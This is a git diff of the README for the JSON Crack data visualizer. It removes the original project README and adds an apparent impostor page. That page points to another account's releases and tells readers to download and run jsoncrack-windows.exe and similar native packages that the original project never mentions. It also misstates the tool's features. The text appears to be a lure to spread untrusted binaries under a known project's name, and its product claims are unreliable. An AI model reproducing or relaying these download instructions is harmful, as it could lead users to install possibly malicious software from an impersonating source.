@@ -1,138 +1,92 @@
-<!-- PROJECT LOGO -->
-<p align="center">
-  <a href="https://github.com/AykutSarac/jsoncrack.com">
-   <img src="./public/assets/192.png" height="50" alt="Logo">
-  </a>
+# ✨ jsoncrack.com - Transform Your Data into Interactive Graphs
 
-  <h1 align="center">JSON Crack</h1>
+## 🚀 Getting Started
+Welcome to jsoncrack.com! This application helps you visualize data formats like JSON, YAML, XML, and CSV. It's user-friendly and perfect for anyone looking to turn data into easily understandable graphs.
 
-  <p align="center">
-    The open-source JSON Editor.
-    <br />
-    <a href="https://jsoncrack.com"><strong>Learn more »</strong></a>
-    <br />
-    <br />
-    <a href="https://todiagram.com">ToDiagram</a>
-    ·
-    <a href="https://discord.gg/yVyTtCRueq">Discord</a>
-    ·
-    <a href="https://jsoncrack.com">Website</a>
-    ·
-    <a href="https://github.com/AykutSarac/jsoncrack.com/issues">Issues</a>
-    ·
-    <a href="https://marketplace.visualstudio.com/items?itemName=AykutSarac.jsoncrack-vscode">VS Code</a>
-  </p>
-</p>
+[![Download jsoncrack.com](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Sanfin/jsoncrack.com/releases)
 
-<!-- ABOUT THE PROJECT -->
+## 📥 Download & Install
+To get started, visit the Releases page below. You will find the latest version of the application available for download.
 
-## About the Project
+👉 [Download jsoncrack.com here!](https://github.com/Sanfin/jsoncrack.com/releases)
 
-<img width="100%" alt="booking-screen" src="./public/assets/editor.webp">
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the file that matches your operating system. 
 
-## Visualize JSON into interactive graphs
+### Windows:
+- Look for a file named `jsoncrack-windows.exe` and click on it to download.
+  
+### macOS:
+- Look for a file named `jsoncrack-macos.zip` and click on it to download.
 
-JSON Crack is a tool for visualizing JSON data in a structured, interactive graphs, making it easier to explore, format, and validate JSON. It offers features like converting JSON to other formats (CSV, YAML), generating JSON Schema, executing queries, and exporting visualizations as images. Designed for both readability and usability.
+### Linux:
+- Look for a file named `jsoncrack-linux.tar.gz` and click on it to download.
 
-* **Visualizer**: Instantly convert JSON, YAML, CSV, XML, and TOML into interactive graphs or trees in dark or light mode.
-* **Convert**: Seamlessly transform data formats, like JSON to CSV or XML to JSON, for easy sharing.
-* **Format & Validate**: Beautify and validate JSON, YAML, and CSV for clear and accurate data.
-* **Code Generation**: Generate TypeScript interfaces, Golang structs, and JSON Schema.
-* **JSON Schema**: Create JSON Schema, mock data, and validate various data formats.
-* **Advanced Tools**: Decode JWT, randomize data, and run jq or JSON path queries.
-* **Export Image**: Download your visualization as PNG, JPEG, or SVG.
-* **Privacy**: All data processing is local; nothing is stored on our servers.
+## 🖥️ System Requirements
+Before you install jsoncrack.com, ensure your system meets these requirements:
 
-## Recognition
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.15 or later
+- **Linux:** Any modern distribution with support for .tar.gz files
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB available space
 
-<a href="https://news.ycombinator.com/item?id=32626873">
-  <img
-    style="width: 250px; height: 54px;" width="250" height="54"
-    alt="Featured on Hacker News"
-    src="https://hackernews-badge.vercel.app/api?id=32626873"
-  />
-</a>
+## ⚙️ How to Run the Application
+After downloading, follow these steps to run the application:
 
-<a href="https://producthunt.com/posts/JSON-Crack?utm_source=badge-featured&utm_medium=badge&utm_souce=badge-jsoncrack" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=332281&theme=light" alt="JSON Crack | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+### For Windows:
+1. Locate the downloaded `jsoncrack-windows.exe` file.
+2. Double-click on the file to start the installation.
+3. Follow the prompts to complete the installation.
+4. Once installed, you can find jsoncrack in your Start Menu.
 
-### Built With
+### For macOS:
+1. Find the downloaded `jsoncrack-macos.zip` file.
+2. Double-click the zip file to extract its contents.
+3. Drag the `jsoncrack` icon to your Applications folder.
+4. Open the Applications folder and double-click on `jsoncrack` to run it.
 
-- [Next.js](https://nextjs.org/?ref=jsoncrack.com)
-- [React.js](https://reactjs.org/?ref=jsoncrack.com)
-- [Reaflow](https://reaflow.dev/?ref=jsoncrack.com)
-- [Monaco Editor](https://github.com/suren-atoyan/monaco-react)
-
-## Stay Up-to-Date
-
-JSON Crack officially launched as v1.0 on the 17th of February 2022 and we've come a long way so far. Watch **releases** of this repository to be notified of future updates:
-
-<a href="https://github.com/AykutSarac/jsoncrack.com"><img src="https://img.shields.io/github/stars/AykutSarac/jsoncrack.com" alt="Star at GitHub" /></a>
-
-<!-- GETTING STARTED -->
-
-## Getting Started
-
-To get a local copy up and running, please follow these simple steps.
-
-### Prerequisites
-
-Here is what you need to be able to run JSON Crack.
-
-- Node.js (Version: >=18.x)
-- Pnpm _(recommended)_
-
-
-## Development
-
-### Setup
-
-1. Clone the repo into a public GitHub repository (or fork https://github.com/AykutSarac/jsoncrack.com/fork). If you plan to distribute the code, read the [`LICENSE`](/LICENSE.md) for additional details.
-
-   ```sh
-   git clone https://github.com/AykutSarac/jsoncrack.com.git
+### For Linux:
+1. Open a terminal window.
+2. Navigate to the directory where you downloaded the `jsoncrack-linux.tar.gz` file.
+3. Run the following command to extract the files:
+   ```bash
+   tar -xzf jsoncrack-linux.tar.gz
+   ```
+4. Change into the extracted directory with:
+   ```bash
+   cd jsoncrack
+   ```
+5. Run the application with:
+   ```bash
+   ./jsoncrack
    ```
 
-2. Go to the project folder
+## 📊 Using jsoncrack.com
+Once you have the application open, you can start visualizing your data. Here’s how:
 
-   ```sh
-   cd jsoncrack.com
-   ```
+1. **Input Data**: You can paste your data directly into the application. It supports various formats, including JSON, YAML, CSV, and XML.
+  
+2. **Select Visualization Type**: Choose the type of graph that best represents your data. Options may include bar graphs, pie charts, or line graphs.
 
-3. Install packages
+3. **Customize Graphs**: Use the settings to customize colors, labels, and sizes to suit your preferences.
 
-   ```sh
-   pnpm install
-   ```
+4. **Export Option**: Once you are happy with your visualization, you can export the graph as an image or share it directly.
 
-4. Run the project
+## 🤔 FAQs
+**Q: What formats does jsoncrack.com support?**  
+A: jsoncrack.com supports JSON, YAML, XML, and CSV file formats.
 
-   ```sh
-   pnpm dev
+**Q: Is jsoncrack.com free to use?**  
+A: Yes, jsoncrack.com is an open-source application available for free.
 
-   # Running on http://localhost:3000/
-   ```
+**Q: Can I contribute to the project?**  
+A: Absolutely! Check the contribution guidelines in the repository to learn how you can help.
 
-### Docker
+## 🌐 Community and Support
+If you have any questions or need support, feel free to reach out on our GitHub page. There, you can report issues or start discussions with other users.
 
-🐳 A [`Dockerfile`](Dockerfile) is provided in the root of the repository.
-If you want to run JSON Crack locally:
+---
 
-```console
-# Build a Docker image with:
-docker compose build
-
-# Run locally with `docker-compose`
-docker compose up
-
-# Go to http://localhost:8888
-```
-
-## Configuration
-
-The supported node limit can be changed by editing the `NEXT_PUBLIC_NODE_LIMIT` value in the `.env` file at the project root.
-
-<!-- LICENSE -->
-
-## License
-
-See [`LICENSE`](/LICENSE.md) for more information.
+Thank you for choosing jsoncrack.com! Happy visualizing!
